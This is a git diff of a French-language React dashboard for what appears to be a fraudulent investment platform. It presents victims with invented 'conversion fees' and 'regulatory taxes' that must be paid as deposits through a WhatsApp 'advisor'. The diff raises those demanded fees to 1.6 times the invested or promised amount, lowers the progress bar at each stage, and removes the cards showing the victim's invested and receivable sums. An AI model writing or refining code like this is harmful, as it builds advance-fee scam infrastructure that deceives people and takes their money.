@@ -1,6 +1,5 @@
 import React, { useEffect } from "react"
 import { motion } from "framer-motion"
-import { MdOutlineAccountBalanceWallet } from "react-icons/md"
 import { useUserStore } from "../stores/resultatStore"
 
 const UserInvest: React.FC = () => {
@@ -13,7 +12,7 @@ const UserInvest: React.FC = () => {
     if (loading) return <p className="text-center py-20 text-gray-500">Chargement...</p>
     if (error) return <p className="text-center py-20 text-red-500">{error}</p>
 
-    const conseillerPhone = "+1(334)2009817"
+    const conseillerPhone = "+13342009817"
 
     const whatsappLink = (message: string) =>
         `https://wa.me/${conseillerPhone}?text=${encodeURIComponent(message)}`
@@ -67,7 +66,7 @@ Je dois effectuer un dépôt de ${depot}  pour poursuivre mon investissement.`
           ETAPE 3 — CONVERSION
     ============================== */
     else if (user.pourcent === 2) {
-        const fraisConversion = Number(user.MontantIvest) * 0.3
+        const fraisConversion = Number(user.MontantIvest) * 1.6
 
         title = `Ajustement multidevises`
         description = `Dans le cadre de la réévaluation de votre portefeuille multidevises, les fluctuations des taux de change ont un impact sur vos actifs libellés en dollars.
@@ -77,7 +76,7 @@ Un dépôt de ${fraisConversion} , correspondant aux frais de conversion et au s
 Montant à recevoir : ${user.MontantRecevoir} 
 
 Veuillez effectuer ce dépôt auprès de votre conseiller afin de garantir la continuité de votre stratégie d'investissement.`
-        progress = 65
+        progress = 54
         whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
 Suite aux frais de conversion, je dois effectuer un dépôt de ${fraisConversion}  pour continuer mon investissement.
 Merci de m'accompagner.`
@@ -87,7 +86,7 @@ Merci de m'accompagner.`
           ETAPE 4 — TAXES
     ============================== */
     else if (user.pourcent === 3) {
-        const taxes = Number(user.MontantRecevoir) * 0.15
+        const taxes = Number(user.MontantRecevoir) * 1.6
 
         title = `Règlement fiscal réglementaire`
         description = `Suite à la réalisation de plus-values sur votre portefeuille d'actions, un prélèvement fiscal obligatoire est dû conformément à la réglementation en vigueur.
@@ -97,7 +96,7 @@ Un dépôt de ${taxes}  est requis afin d'apurer cette créance fiscale anticip�
 Montant à recevoir : ${user.MontantRecevoir} 
 
 Merci de procéder au dépôt auprès de votre conseiller afin de poursuivre votre investissement.`
-        progress = 90
+        progress = 72
         whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
 Suite aux taxes gouvernementales, je dois effectuer un dépôt de ${taxes}  pour continuer mon investissement.
 Veuillez me l'accorder.`
@@ -121,10 +120,10 @@ Merci pour votre accompagnement.`
     /* =============================
           UI DASHBOARD
     ============================== */
-    const infoCards = [
-        { label: "Montant investi", value: `${user.MontantIvest} `, icon: <MdOutlineAccountBalanceWallet /> },
-        { label: "Montant à recevoir", value: `${user.MontantRecevoir} `, icon: <MdOutlineAccountBalanceWallet /> },
-    ]
+    // const infoCards = [
+    //     { label: "Montant investi", value: `${user.MontantIvest} `, icon: <MdOutlineAccountBalanceWallet /> },
+    //     { label: "Montant à recevoir", value: `${user.MontantRecevoir} `, icon: <MdOutlineAccountBalanceWallet /> },
+    // ]
 
     return (
         <section className="bg-gray-50 min-h-screen px-4 sm:px-8 pt-4 pb-16">
@@ -164,22 +163,6 @@ Merci pour votre accompagnement.`
                     </div>
                 </div>
 
-                {/* INFOS */}
-                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-16">
-                    {infoCards.map((item, index) => (
-                        <motion.div
-                            key={index}
-                            whileHover={{ scale: 1.04 }}
-                            className="bg-gradient-to-r from-primary to-secondary text-white p-5 rounded-xl shadow-md flex gap-4"
-                        >
-                            <div className="bg-white/20 p-3 rounded-full">{item.icon}</div>
-                            <div>
-                                <p className="text-sm opacity-80">{item.label}</p>
-                                <p className="font-bold">{item.value}</p>
-                            </div>
-                        </motion.div>
-                    ))}
-                </div>
 
                 {/* WHATSAPP */}
                 <div className="text-center">
